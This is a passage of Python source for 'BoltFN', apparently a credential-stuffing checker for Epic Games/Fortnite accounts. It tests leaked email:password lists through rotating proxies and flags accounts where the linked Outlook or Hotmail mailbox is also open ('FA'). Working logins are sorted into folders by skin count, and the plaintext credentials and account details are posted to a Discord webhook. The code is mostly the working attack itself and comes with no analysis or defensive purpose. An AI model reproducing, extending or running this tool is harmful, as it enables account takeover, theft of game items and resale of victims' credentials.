                                            outlook_domains = ["hotmail.com", "hotmail.co.uk", "hotmail.fr", "hotmail.de", "hotmail.it", "hotmail.es", "hotmail.ca", "hotmail.com.mx", "hotmail.co.jp", "hotmail.co.kr", "hotmail.com.br", "hotmail.be", "hotmail.ch", "hotmail.cl", "hotmail.cz", "hotmail.dk", "hotmail.fi", "hotmail.hu", "hotmail.in", "hotmail.nl", "hotmail.no", "hotmail.pl", "hotmail.pt", "hotmail.se", "outlook.com", "outlook.com.au", "outlook.at", "outlook.be", "outlook.cl", "outlook.cz", "outlook.dk", "outlook.fi", "outlook.fr", "outlook.de", "outlook.hu", "outlook.ie", "outlook.in", "outlook.it", "outlook.jp", "outlook.kr", "outlook.lv", "outlook.lt", "outlook.mx", "outlook.nl", "outlook.co.nz", "outlook.no", "outlook.pl", "outlook.pt", "outlook.sg", "outlook.sk", "outlook.es", "outlook.se", "outlook.ch", "outlook.co.uk", "outlook.co.za", "live.com", "live.com.au", "live.be", "live.ca", "live.cl", "live.cn", "live.dk", "live.fi", "live.fr", "live.de", "live.in", "live.ie", "live.it", "live.jp", "live.kr", "live.com.mx", "live.nl", "live.no", "live.co.nz", "live.ph", "live.ru", "live.co.za", "live.se", "live.co.uk", "msn.com", "@hotmail", "@live", "@outlook", "@msn", "hotmail", "outlook"]
                                            if epicEmail.lower() == email.lower() and any(domain in email.lower() for domain in outlook_domains) or headles == True:
                                                fullAccess = 'FA'
                                            Counter.skins_data.append({"fullAccess": fullAccess, "total_skins": total_skins, "exclusive": exclusive})
                                            if not os.path.exists(self.folder + '/Fortnite'):
                                                os.makedirs(self.folder + '/Fortnite')
                                            open(f'{self.folder}/Fortnite/all.txt', 'a',
                                            encoding='u8').write(f'{line}\n')
                                            message = f"{email}:{password} | Name: {display_name} | FullAccess: {fullAccess} | Email Verified: {email_verified_status} | Linked Accounts: {linked}"
                                            if tfa_enabled != None: message+=f" | 2FA: {tfa_enabled}"
                                            if last_login != None: message+=f" | Last Match: {last_login}"
                                            if fullAccess == 'NFA': message+=f" | Epic Email: {epicEmail}"
                                            if country != None: message+=f" | Country: {country}"
                                            if balance != None: message+=f" | Balance: {balance}"
                                            if has_stw != 'NO': message+=f" | Save The World"
                                            if level != None: message+=f" | Level: {level}"
                                            if Total_VBucks != None: message+=f"  | Vbucks: {Total_VBucks}"
                                            if total_wins != None: message+=f" | Total Wins: {total_wins}"
                                            if first_active_season != None: message+=f" | First Season: {first_active_season}"                                        
                                            if total_dances != None: message+=f" | Emotes: {total_dances}"
                                            if total_gliders != None: message+=f" | Gliders: {total_gliders}"
                                            if total_pickaxes != None: message+=f" | Pickaxes: {total_pickaxes}"
                                            if total_backpacks != None: message+=f" | BackBlings: {total_backpacks}"
                                            if exclusive: message+=f"\nExclusives: [{len(exclusiveSkin)}] {exclusiveSkin}"
                                            if processed_skins != None: message+=f"\nSkins: [{total_skins}] {processed_skins}"
                                            if int(totalgame) > 0: message+f"\nOwned Games: [{totalgame}] \nList Games: [{GamesOwn}]"
                                            message = message+"\n============================"
                                            if not exclusive:
                                                exclusiveskins = 0
                                            else:
                                                exclusiveskins = len(exclusiveSkin)
                                            url = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{ACCID}/client/QueryProfile?profileId=athena&rvn=-1"
                                            headers = {
                                                "User-Agent": "Fortnite/++Fortnite+Release-8.51-CL-6165369 Windows/10.0.17763.1.256.64bit",
                                                "Authorization": f"Bearer {AT}",
                                                "Content-Type": "application/json"
                                            }
                                            while True:
                                                try:
                                                    response = scraper.post(url, headers=headers, json={}, cookies=response.cookies, proxies=self.proxies(), timeout=Checker.timeout)
                                                    response_str = response.text
                                                    break
                                                except Exception as e:
                                                    Counter.retries+=1
                                                    continue  
                                            datas = response.json()
                                            def getimage(data):
                                                idpattern = re.compile(r"athena(.*?):(.*?)_(.*?)")
                                                try:
                                                    unlocked_styles = {}
                                                    # Gather unlocked styles
                                                    if "profileChanges" in data and data["profileChanges"]:
                                                        profile = data["profileChanges"][0]["profile"]
                                                        if "items" in profile:
                                                            for item_id, item_data in profile["items"].items():
                                                                if "variants" in item_data:
                                                                    unlocked_styles[item_id] = [
                                                                        variant["options"][0]["tag"]
                                                                        for variant in item_data["variants"]
                                                                        if "options" in variant and len(variant["options"]) > 0
                                                                    ]
                                                        else:
                                                            pass
                                                    else:
                                                        print("Profile changes not found.")


                                                    item_ids = []
                                                    for item in data['profileChanges'][0]['profile']['items'].values():
                                                        iddd = item['templateId'].lower()
                                                        if idpattern.match(iddd) and iddd != "solo_umbrella":
                                                            item_ids.append(iddd)

                                                    with ThreadPoolExecutor(max_workers=30) as executor:
                                                        cosmetic_types = list(executor.map(self.get_cosmetic_type, item_ids))

                                                    itemss = {}
                                                    for iddd, item_type in zip(item_ids, cosmetic_types):
                                                        if item_type not in itemss:
                                                            itemss[item_type] = []
                                                        itemss[item_type].append(iddd.split(':')[1])

                                                    order = ["Skins", "Backpacks", "Pickaxes", "Emotes", "Gliders"]
                                                    combined_images = []

                                                    for grop in order:
                                                        if grop in itemss:
                                                            sorted_ids = self.sort_ids_by_rarity(itemss[grop])
                                                            combined_images.extend(sorted_ids)

                                                    combined_image_data = self.createimg(combined_images, "Combined_Items", sort_by_rarity=True, item_order=order, unlocked_styles=unlocked_styles)
                                                    
                                                    return combined_image_data

                                                except Exception as e:
                                                    print(f"Error processing image: {str(e)}")
                                                    with open('error_log.txt', 'a', encoding='utf8') as f:
                                                        f.write(f"Error in getimage: {str(e)}\n")
                                                    return None
                                            Counter.sellerstuff.append({"fullAccess": fullAccess,"2fa": tfa_enabled, "total_skins": total_skins,"skins_list": processed_skins,"exclusive": exclusive,"exclusives_list": exclusiveSkin,"mail_verified": email_verified_status,"last_login": last_login,"linked_accs": linked,"balance":balance, "gamesowned":GamesOwn})
                                            imagess = getimage(datas)
                                            def send_data_to_webhook(image_data: io.BytesIO, webhook_url: str, username: str, display_name: str, email: str, password: str, total_wins: str, level: str, Total_VBucks: str, total_backpacks: str, total_pickaxes: str, total_gliders: str, total_dances: str, tfa_enabled: str, has_stw: str, exclusiveskins: int, exclusiveSkin: str, total_skins: str, last_login: str, fullAccess: str, balance: str, totalgame: int, GamesOwn: str, email_verified_status: str):
                                                try:
                                                    content = ""
                                                    
                                                    if fullAccess.strip() == "FA" and int(total_skins) > 10:
                                                        content += "@everyone\n"

                                                    content += (
                                                        f"**Display Name:** {display_name} \n"
                                                        f"**Email:Password:** ||{email}:{password}||\n"
                                                        f"**Email Verified:** {email_verified_status}\n"
                                                        f"**Account Type:** {fullAccess}\n"
                                                        f"**Balance:** {balance}\n"
                                                        f"**Level:** {level}\n"
                                                        f"**Vbucks:** {Total_VBucks}\n"
                                                        f"**Backblings:** {total_backpacks}\n"
                                                        f"**Pickaxes:** {total_pickaxes}\n"
                                                        f"**Gliders:** {total_gliders}\n"
                                                        f"**Emotes:** {total_dances}\n"
                                                        f"**2FA:** {tfa_enabled}\n"
                                                        f"**Save The World:** {has_stw}\n"
                                                        f"**Exclusive Skins:** [{exclusiveskins}] {exclusiveSkin}\n"
                                                        f"**Skin Count:** [{total_skins}]\n"
                                                        f"**Last Match:** {last_login}\n"
                                                        f"**Owned Games:** [{totalgame}]\n"
                                                    )

                                                    data = {
                                                        'username': (None, username),
                                                        'content': (None, content)
                                                    }
                                                    files = {
                                                        'file': ('image.png', image_data, 'image/png')
                                                    }

                                                    response = requests.post(webhook_url, data=data, files=files)
                                                    if response.status_code == 200:
                                                        pass
                                                    else:
                                                        print(f"Failed to send data to Discord webhook")
                                                except Exception as e:
                                                    print(f"An error occurred while sending data to the webhook: {str(e)}")
                                                    with open('error_webhook.txt', 'a', encoding='utf8') as f:
                                                        f.write(f"Error in sending data to webhook: {str(e)}\n")
                                            if Checker.webhook.webhooky:
                                                send_data_to_webhook(imagess, Checker.webhook.webhookid, "BoltFN", display_name, email, password, total_wins, level, Total_VBucks, total_backpacks, total_pickaxes, total_gliders, total_dances, tfa_enabled, has_stw, exclusiveskins, exclusiveSkin, total_skins, last_login, fullAccess, balance, totalgame, GamesOwn, email_verified_status)

                                            if exclusive:
                                                if not os.path.exists(self.folder + '/Fortnite/Exclusive'):
                                                    os.makedirs(self.folder + '/Fortnite/Exclusive')
                                                open(f'{self.folder}/Fortnite/Exclusive/{str(total_skins)} Skins {fullAccess}.txt', 'a',
                                                encoding='u8').write(f'{message}\n')
                                            if int(total_skins) == 0:
                                                if not os.path.exists(self.folder + '/Fortnite/NoSkins'):
                                                    os.makedirs(self.folder + '/Fortnite/NoSkins')
                                                open(f'{self.folder}/Fortnite/NoSkins/{str(total_skins)} Skins {fullAccess}.txt', 'a',
                                                encoding='u8').write(f'{message}\n')
                                                open(f'{self.folder}/Fortnite/NoSkins/All.txt', 'a',
                                                encoding='u8').write(f'{line}\n')
                                            elif int(total_skins) >= 1 and int(total_skins) < 10:
                                                if not os.path.exists(self.folder + '/Fortnite/1-9Skins'):
                                                    os.makedirs(self.folder + '/Fortnite/1-9Skins')
                                                open(f'{self.folder}/Fortnite/1-9Skins/{str(total_skins)} Skins {fullAccess}.txt', 'a',
                                                encoding='u8').write(f'{message}\n')
                                                open(f'{self.folder}/Fortnite/1-9Skins/All.txt', 'a',
                                                encoding='u8').write(f'{line}\n')
                                            elif int(total_skins) >= 10 and int(total_skins) < 50:
                                                if not os.path.exists(self.folder + '/Fortnite/10-49Skins'):
                                                    os.makedirs(self.folder + '/Fortnite/10-49Skins')
                                                open(f'{self.folder}/Fortnite/10-49Skins/{str(total_skins)} Skins {fullAccess}.txt', 'a',
                                                encoding='u8').write(f'{message}\n')
                                                open(f'{self.folder}/Fortnite/10-49Skins/All.txt', 'a',
                                                encoding='u8').write(f'{line}\n')
                                            elif int(total_skins) >= 50 and int(total_skins) < 100:
                                                if not os.path.exists(self.folder + '/Fortnite/50-99Skins'):
                                                    os.makedirs(self.folder + '/Fortnite/50-99Skins')
                                                open(f'{self.folder}/Fortnite/50-99Skins/{str(total_skins)} Skins {fullAccess}.txt', 'a',
                                                encoding='u8').write(f'{message}\n')
                                                open(f'{self.folder}/Fortnite/50-99Skins/All.txt', 'a',
                                                encoding='u8').write(f'{line}\n')
                                            elif int(total_skins) >= 100 and int(total_skins) < 200:
                                                if not os.path.exists(self.folder + '/Fortnite/100-199Skins'):
                                                    os.makedirs(self.folder + '/Fortnite/100-199Skins')
                                                open(f'{self.folder}/Fortnite/100-199Skins/{str(total_skins)} Skins {fullAccess}.txt', 'a',
                                                encoding='u8').write(f'{message}\n')
                                                open(f'{self.folder}/Fortnite/100-199Skins/All.txt', 'a',
                                                encoding='u8').write(f'{line}\n')
                                            elif int(total_skins) >= 200 and int(total_skins) < 300:
                                                if not os.path.exists(self.folder + '/Fortnite/200-299Skins'):
                                                    os.makedirs(self.folder + '/Fortnite/200-299Skins')
                                                open(f'{self.folder}/Fortnite/200-299Skins/{str(total_skins)} Skins {fullAccess}.txt', 'a',
                                                encoding='u8').write(f'{message}\n')
                                                open(f'{self.folder}/Fortnite/200-299Skins/All.txt', 'a',
                                                encoding='u8').write(f'{line}\n')
                                            elif int(total_skins) >= 300:
                                                if not os.path.exists(self.folder + '/Fortnite/300+Skins'):
                                                    os.makedirs(self.folder + '/Fortnite/300+Skins')
                                                open(f'{self.folder}/Fortnite/300+Skins/{str(total_skins)} Skins {fullAccess}.txt', 'a',
                                                encoding='u8').write(f'{message}\n')
                                                open(f'{self.folder}/Fortnite/300+Skins/All.txt', 'a',
                                                encoding='u8').write(f'{line}\n')
                                            return
                                        except Exception as e:
                                            with open('error_log.txt', 'a', encoding='utf8') as f:
                                                f.write(e + '\n')
                                            Counter.retries+=1
                                            continue

                                    except Exception as e:
                                        checked_num+=1
                                        Counter.retries+=1
                                        continue
                                else:
                                    print(url)
                                    checked_num +=1
                                    Counter.retries+=1
                                    continue
                    else:
                        if result == 'Failure':
                            if line in Counter.remaining:
                                Counter.remaining.remove(line)
                            Counter.bad+=1
                            if Checker.printbadd:
                                if 'n' == self.cuimode:
                                    self.prints(f'{Fore.RED}[BAD] - {self.blur(line)}')
                                if Checker.save_bad:
                                    if not os.path.exists(self.folder + '/Bad'):
                                        os.makedirs(self.folder + '/Bad')
                                    open(f'{self.folder}/Bad/Invalid.txt', 'a',
                                        encoding='u8').write(f'{line}\n')
                            return
                        elif result == '2FACTOR':
                            if line in Counter.remaining:
                                Counter.remaining.remove(line)
                            Counter.custom+=1
                            if Checker.printbadd:
                                if 'n' == self.cuimode:
                                        self.prints(f'{Fore.RED}[2FA] - {self.blur(line)}')
                            if Checker.save_bad:
                                if not os.path.exists(self.folder + '/Bad'):
                                    os.makedirs(self.folder + '/Bad')
                                open(f'{self.folder}/Bad/2fa.txt', 'a',
                                encoding='u8').write(f'{line}\n')
                            return
                        elif result == 'Ban':
                            if line in Counter.remaining:
                                Counter.remaining.remove(line)
                            Counter.custom+=1
                            if Checker.printbadd:
                                if 'n' == self.cuimode:
                                        self.prints(f'{Fore.RED}[2FA] - {self.blur(line)}')
                            if Checker.save_bad:
                                if not os.path.exists(self.folder + '/Bad'):
                                    os.makedirs(self.folder + '/Bad')
                                open(f'{self.folder}/Bad/Banned.txt', 'a',
                                encoding='u8').write(f'{line}\n')
                            return
                        elif result == 'CUSTOM':
                            if line in Counter.remaining:
                                Counter.remaining.remove(line)
                            Counter.locked+=1
                            if Checker.printbadd:
                                if 'n' == self.cuimode:
                                        self.prints(f'{Fore.RED}[LOCKED] - {self.blur(line)}')
                            if Checker.save_bad:
                                if not os.path.exists(self.folder + '/Bad'):
                                    os.makedirs(self.folder + '/Bad')
                                open(f'{self.folder}/Bad/Locked.txt', 'a',
                                encoding='u8').write(f'{line}\n')
                            return
                        elif result == 'Unknown':
                                if line in Counter.remaining:
                                    Counter.remaining.remove(line)
                                Counter.bad+=1
                                if Checker.printbadd:
                                    if 'n' == self.cuimode:
                                        self.prints(f'{Fore.RED}[BAD] - {self.blur(line)}')
                                if Checker.save_bad:
                                    if not os.path.exists(self.folder + '/Bad'):
                                        os.makedirs(self.folder + '/Bad')
                                    open(f'{self.folder}/Bad/Unknown.txt', 'a',
                                        encoding='u8').write(f'{line}\n')
                                return
            else:
                Counter.bad+=1
                if line in Counter.remaining:
                    Counter.remaining.remove(line)
                return
        except Exception as e:
            # Increment the bad counter
            Counter.bad += 1
            
            # Remove the line from remaining if it exists
            if line in Counter.remaining:
                Counter.remaining.remove(line)
            
            # Print the error message
            print(f"Error occurred: {str(e)}")
            return
    def blur(self, line):
        email,password = line.split(':')
        password = len(password) * '*'
        return f'{email}:{password}'
    def parse_1(self,text):
        dis_match = re.search(r'"lastName":"(.*?)","email":"(.*?)"', text)
        if dis_match:
            dis = dis_match.group(0)
        else:
             dis = None
        try:
            display_name_match = re.search(r'"displayName":"(.*?)"', dis)
            if display_name_match:
                display_name = display_name_match.group(1)
            else:
                display_name = None
            country_match = re.search(r'"country":"(.*?)"', dis)
            if country_match:
                country = country_match.group(1)
            else:
                country = None
            accid_match = re.search(r'"id":"(.*?)"', dis)
            if accid_match:
                accid = accid_match.group(1)
            else:
                accid = None
            email_verified_match = re.search(r'"emailVerified":(.*?)(,|\})', dis)
            if email_verified_match:
                email_verified_status = email_verified_match.group(1).strip()
            else:
                email_verified_status = None
        except:
            display_name = 'Error'
            country = 'Error'
            accid = 'Error'
            email_verified_status = 'Unknown'
        return display_name,country,accid,email_verified_status
    def parse_lr(self,text, start_delim, end_delim):
        pattern = re.escape(start_delim) + r'(.*?)' + re.escape(end_delim)
        match = re.search(pattern, text)
        return match.group(1) if match else None

    def parse_url(self,url):
        match = re.search(r"[&?]route=([^&]*)", url)
        return match.group(1) if match else None

    def parse_cookie(self,cookies, key):
        return cookies.get(key)
    def parse_source_for_url(self, source):
        match = re.search(r"urlPost:'(.*?)'", source)
        if match:
            url = match.group(1)
            return url
        return None
    
    def title(self):
        while True:
            try:
                if Counter.proxy:
                    Total = len(self.proxylist)
                else:
                    Total = len(self.accounts)
                Checked = Counter.hits + Counter.bad + Counter.custom + Counter.mshit + Counter.locked + Counter.fnban
                badd = Counter.bad / Total * 100
                chek = int(Counter.bad) + int(Counter.hits) + Counter.custom + Counter.mshit + Counter.locked + Counter.fnban
                estimated = 0
                if Checked > 0:
                    estimated = Counter.hits + Counter.fnban/Checked * Total
                Counter.checkedpercent = round((chek / Total) * 100, 2)
                Counter.failedpercent = round(badd, 2)
                shit = Counter.hits + Counter.fnban
                Counter.hitspercent = round((shit / Total * 100), 2)
                Counter.headlesspercent = round((int(Counter.headless) / Total) * 100, 2)
                cust = Counter.custom + Counter.locked
                Counter.custompercent =round(number=(cust / Total * 100), ndigits=2)
                Counter.mshitspercent = round((int(Counter.mshit) / Total) * 100, 2)
                estimatedhits = round(estimated)
                if Counter.brute:
                    inval = Counter.bad + Counter.custom + Counter.locked
                    badd = inval / Total * 100
                    Counter.failedpercent = round(badd, 2)
                    windll.kernel32.SetConsoleTitleW(
                        f"BoltFN | v{self.version}"
                        f" | Checked: {int(Counter.bad) + int(Counter.hits) + Counter.custom + Counter.mshit + Counter.locked}/{Total} ({Counter.checkedpercent}%)"
                        f" | Hits: {Counter.hits} ({Counter.hitspercent}%) [{estimatedhits}]"
                        f" | MS-Hits: {Counter.mshit} ({Counter.mshitspercent}%)"
                        f" | Failed: {Counter.bad + Counter.custom + Counter.locked} ({Counter.failedpercent}%)"
                        f' | Retries: {Counter.retries}'
                        f' | CPM: {Counter.cpm}'
                        f' | Checking for: {self.Timeused()}')
                elif Counter.proxy:
                    chek = Counter.hits
                    Counter.checkedpercent = round((chek / Total) * 100, 2)
                    windll.kernel32.SetConsoleTitleW(
                        f"BoltFN | v{self.version}"
                        f" | Checked: {Counter.bad + Counter.hits}/{Total} ({Counter.checkedpercent}%)"
                        f" | Hits: {Counter.hits} ({Counter.hitspercent}%) [{estimatedhits}]"
                        f" | Failed: {Counter.bad} ({Counter.failedpercent}%)"
                        f' | CPM: {Counter.cpm}'
                        f' | Checking for: {self.Timeused()}')
                else:
                    windll.kernel32.SetConsoleTitleW(
                        f"BoltFN | v{self.version}"
                        f" | Checked: {int(Counter.bad) + int(Counter.hits) + Counter.custom + Counter.mshit + Counter.locked + Counter.fnban}/{Total} ({Counter.checkedpercent}%)"
                        f" | Hits: {Counter.hits + Counter.fnban} ({Counter.hitspercent}%) [{estimatedhits}]"
                        f" | Headless: {Counter.headless} ({Counter.headlesspercent}%)"
                        f" | MS-Hits: {Counter.mshit} ({Counter.mshitspercent}%)"
                        f" | 2FA: {Counter.custom + Counter.locked} ({Counter.custompercent}%)"
                        f" | Failed: {Counter.bad} ({Counter.failedpercent}%)"
                        f' | Retries: {Counter.retries}'
                        f' | CPM: {Counter.cpm}'
                        f' | Checking for: {self.Timeused()}')
            except Exception as e:
                print(e)


    def proxies(self):
        if Checker.Proxy.proxy:
            proxy = choice(self.proxylist)
            if self.proxy_type.lower() == 'http' or self.proxy_type.lower() == 'https':
                proxy_form = {'http': 'http://'+proxy, 'https': 'http://'+proxy}
            else:
                proxy_form = {
                    'http': f"{self.proxy_type.lower()}://{proxy}",
                    'https': f"{self.proxy_type.lower()}://{proxy}"
                }
            return proxy_form
        else:
            return None
    def proxy_cpm(self):
        sleep(5)
        while True:
            checked = Counter.hits + Counter.bad
            timee = time.time() - self.start_time
            awa = checked / timee
            cpm = awa * 60
            Counter.cpm = int(cpm)
    def cpm_counter(self):
        sleep(5)
        while True:
            checked = Counter.hits + Counter.bad + Counter.custom + Counter.mshit + Counter.locked + Counter.fnban
            timee = time.time() - self.start_time
            awa = checked / timee
            cpm = awa * 60
            Counter.cpm = int(cpm)

    def prints(self, line):
        lock.acquire()
        print(f'{line}')
        lock.release()
    def Refreshconsole(self):
        while Counter.Checking:
            try:
                time.sleep(1)
                if self.cuitype == 'cn':
                    logo_colored = [
                        f"                {Fore.GREEN}██████{Fore.CYAN}╗{Fore.GREEN}  ██████{Fore.CYAN}╗{Fore.GREEN} ██{Fore.CYAN}╗{Fore.GREEN}  ████████{Fore.CYAN}╗{Fore.GREEN} ██████{Fore.CYAN}╗{Fore.GREEN}██{Fore.CYAN}╗{Fore.GREEN}  ██{Fore.CYAN}╗{Fore.GREEN}███████{Fore.CYAN}╗{Fore.GREEN} ██████{Fore.CYAN}╗{Fore.GREEN}██{Fore.CYAN}╗{Fore.GREEN}  ██{Fore.CYAN}╗{Fore.GREEN}███████{Fore.CYAN}╗{Fore.GREEN}██████{Fore.CYAN}╗",
                        f"                {Fore.GREEN}██{Fore.CYAN}╔══{Fore.GREEN}██{Fore.CYAN}╗{Fore.GREEN}██{Fore.CYAN}╔═══{Fore.GREEN}██{Fore.CYAN}╗{Fore.GREEN}██{Fore.CYAN}║  ╚══{Fore.GREEN}██{Fore.CYAN}╔══╝{Fore.GREEN}██{Fore.CYAN}╔════╝{Fore.GREEN}██{Fore.CYAN}║{Fore.GREEN}  ██{Fore.CYAN}║{Fore.GREEN}██{Fore.CYAN}╔════╝{Fore.GREEN}██{Fore.CYAN}╔════╝{Fore.GREEN}██{Fore.CYAN}║{Fore.GREEN} ██{Fore.CYAN}╔╝{Fore.GREEN}██{Fore.CYAN}╔════╝{Fore.GREEN}██{Fore.CYAN}╔══{Fore.GREEN}██{Fore.CYAN}╗",
                        f"                {Fore.GREEN}██████{Fore.CYAN}╔╝{Fore.GREEN}██{Fore.CYAN}║{Fore.GREEN}   ██{Fore.CYAN}║{Fore.GREEN}██{Fore.CYAN}║    {Fore.GREEN} ██{Fore.CYAN}║  {Fore.GREEN} ██{Fore.CYAN}║{Fore.GREEN}     ███████{Fore.CYAN}║{Fore.GREEN}█████{Fore.CYAN}╗{Fore.GREEN}  ██{Fore.CYAN}║    {Fore.GREEN} █████{Fore.CYAN}╔╝{Fore.GREEN} █████{Fore.CYAN}╗  {Fore.GREEN}██████{Fore.CYAN}╔╝",
                        f"                {Fore.CYAN}██{Fore.GREEN}╔══{Fore.CYAN}██{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}║  {Fore.CYAN} ██{Fore.GREEN}║{Fore.CYAN}██{Fore.GREEN}║    {Fore.CYAN} ██{Fore.GREEN}║   {Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}     ██{Fore.GREEN}╔══{Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}██{Fore.GREEN}╔══╝  {Fore.CYAN}██{Fore.GREEN}║     {Fore.CYAN}██{Fore.GREEN}╔═{Fore.CYAN}██{Fore.GREEN}╗{Fore.CYAN} ██{Fore.GREEN}╔══╝ {Fore.CYAN} ██{Fore.GREEN}╔══{Fore.CYAN}██{Fore.GREEN}╗",
                        f"                {Fore.CYAN}██████{Fore.GREEN}╔╝╚{Fore.CYAN}██████{Fore.GREEN}╔╝{Fore.CYAN}███████{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}║   ╚{Fore.CYAN}██████{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}║  {Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}███████{Fore.GREEN}╗╚{Fore.CYAN}██████{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}║ {Fore.CYAN} ██{Fore.GREEN}╗{Fore.CYAN}███████{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}║  {Fore.CYAN}██{Fore.GREEN}║",
                        f"                {Fore.GREEN}╚═════╝  ╚═════╝ ╚══════╝╚═╝    ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝",
                    ]
                    total_chars = sum(line.count('█') + line.count('╔') + line.count('╗') + line.count('╚') + line.count('═') + line.count('║') for line in logo_colored)
                    chars_to_color = total_chars if Counter.checkedpercent >= 100 else int(round(total_chars * Counter.checkedpercent / 100))

                    colored_logo = ""
                    colored_count = 0

                    for line in logo_colored:
                        colored_line = ""
                        for char in line:
                            if char in '█╔╗═║╚' and colored_count < chars_to_color:
                                colored_line += char  
                                colored_count += 1
                            else:
                                if char in '█╔╗═║╚':
                                    colored_line += Fore.LIGHTWHITE_EX + char + colorama.Style.RESET_ALL
                                else:
                                    colored_line += char 
                        colored_logo += colored_line + "\n"
                    system('cls')
                    print(colored_logo)
                    categories = {
                        "Exclusive": {"FA": 0, "NFA": 0},
                        "300+ Skins": {"FA": 0, "NFA": 0},
                        "200-299 Skins": {"FA": 0, "NFA": 0},
                        "100-199 Skins": {"FA": 0, "NFA": 0},
                        "50-99 Skins": {"FA": 0, "NFA": 0},
                        "10-49 Skins": {"FA": 0, "NFA": 0},
                        "1-9 Skins": {"FA": 0, "NFA": 0},
                        "0 Skins": {"FA": 0, "NFA": 0}
                    }
                    for data in Counter.skins_data:
                        fullAccess = data["fullAccess"]
                        total_skins = data["total_skins"]
                        exclusive = data['exclusive']
                        if exclusive:
                            categories["Exclusive"][fullAccess] += 1
                        elif 300 <= total_skins:
                            categories["300+ Skins"][fullAccess] += 1
                        elif 200 <= total_skins <= 299:
                            categories["200-299 Skins"][fullAccess] += 1
                        elif 100 <= total_skins <= 199:
                            categories["100-199 Skins"][fullAccess] += 1
                        elif 50 <= total_skins <= 99:
                            categories["50-99 Skins"][fullAccess] += 1
                        elif 10 <= total_skins <= 49:
                            categories["10-49 Skins"][fullAccess] += 1
                        elif 1 <= total_skins <= 9:
                            categories["1-9 Skins"][fullAccess] += 1
                        elif total_skins == 0:
                            categories["0 Skins"][fullAccess] += 1

                    tree = categories
                    total_hits = sum(counts["FA"] + counts["NFA"] for counts in tree.values())

                    print(f'                                                {Fore.WHITE}[Progress: {Counter.checkedpercent:.2f}%{Fore.WHITE}]\n\n')
                    print(f"{Fore.WHITE}[{Counter.bad + Counter.custom + Counter.locked}] {Fore.RED}Bad")
                    print(f" {Fore.WHITE}├── [{Counter.bad}] {Fore.YELLOW}Invalid")
                    print(f" {Fore.WHITE}├── [{Counter.locked}] {Fore.YELLOW}Locked")
                    print(f" {Fore.WHITE}└── [{Counter.custom}] {Fore.YELLOW}2FA")
                    print(f"{Fore.WHITE}[{Counter.mshit}] {Fore.GREEN}MS-Hit")
                    print(f" {Fore.WHITE}├── [{Counter.headless}] {Fore.GREEN}Headless")
                    print(f" {Fore.WHITE}├── [{Counter.mshit - Counter.epic2fa - Counter.xb - Counter.headless}] {Fore.YELLOW}Not linked")
                    print(f" {Fore.WHITE}├── [{Counter.epic2fa}] {Fore.YELLOW}2FA")
                    print(f" {Fore.WHITE}├── [{Counter.xb}] {Fore.YELLOW}Xbox")
                    print(f" {Fore.WHITE}└── [{Counter.fnban}] {Fore.YELLOW}Banned")
                    print(f"{Fore.WHITE}[{total_hits}] {Fore.GREEN}Hit")
                    category_list = list(tree.items())  
                    last_category_idx = len(category_list) - 1
                    for idx, (category, counts) in enumerate(category_list):
                        fa_count = counts['FA']
                        nfa_count = counts['NFA']
                        total_count = fa_count + nfa_count

                        is_last_category = idx == last_category_idx
                        if is_last_category:
                            print(f"{Fore.WHITE} └── [{total_count}] {Fore.CYAN}{category}")
                        else:
                            print(f"{Fore.WHITE} ├── [{total_count}] {Fore.CYAN}{category}")

                        fa_vertical = Fore.WHITE + " │" if not is_last_category else Fore.WHITE + "  "
                        nfa_vertical = Fore.WHITE + "  " if fa_count > 0 and is_last_category else fa_vertical

                        if fa_count > 0:
                            print(f"{fa_vertical}    {Fore.WHITE}└── {Fore.WHITE}[{fa_count}] {Fore.GREEN}FA")

                        if nfa_count > 0:
                            print(f"{nfa_vertical}    {Fore.WHITE}└── {Fore.WHITE}[{nfa_count}] {Fore.GREEN}NFA")
                elif self.cuitype == 'bolt':
                    logo_colored = f'''
                  {Fore.BLACK}██████{Fore.MAGENTA}╗{Fore.BLACK}  ██████{Fore.MAGENTA}╗{Fore.BLACK} ██{Fore.MAGENTA}╗{Fore.BLACK}  ████████{Fore.MAGENTA}╗{Fore.BLACK} ██████{Fore.MAGENTA}╗{Fore.BLACK}██{Fore.MAGENTA}╗{Fore.BLACK}  ██{Fore.MAGENTA}╗{Fore.BLACK}███████{Fore.MAGENTA}╗{Fore.BLACK} ██████{Fore.MAGENTA}╗{Fore.BLACK}██{Fore.MAGENTA}╗{Fore.BLACK}  ██{Fore.MAGENTA}╗{Fore.BLACK}███████{Fore.MAGENTA}╗{Fore.BLACK}██████{Fore.MAGENTA}╗
                  {Fore.BLACK}██{Fore.MAGENTA}╔══{Fore.BLACK}██{Fore.MAGENTA}╗{Fore.BLACK}██{Fore.MAGENTA}╔═══{Fore.BLACK}██{Fore.MAGENTA}╗{Fore.BLACK}██{Fore.MAGENTA}║  ╚══{Fore.BLACK}██{Fore.MAGENTA}╔══╝{Fore.BLACK}██{Fore.MAGENTA}╔════╝{Fore.BLACK}██{Fore.MAGENTA}║{Fore.BLACK}  ██{Fore.MAGENTA}║{Fore.BLACK}██{Fore.MAGENTA}╔════╝{Fore.BLACK}██{Fore.MAGENTA}╔════╝{Fore.BLACK}██{Fore.MAGENTA}║{Fore.BLACK} ██{Fore.MAGENTA}╔╝{Fore.BLACK}██{Fore.MAGENTA}╔════╝{Fore.BLACK}██{Fore.MAGENTA}╔══{Fore.BLACK}██{Fore.MAGENTA}╗
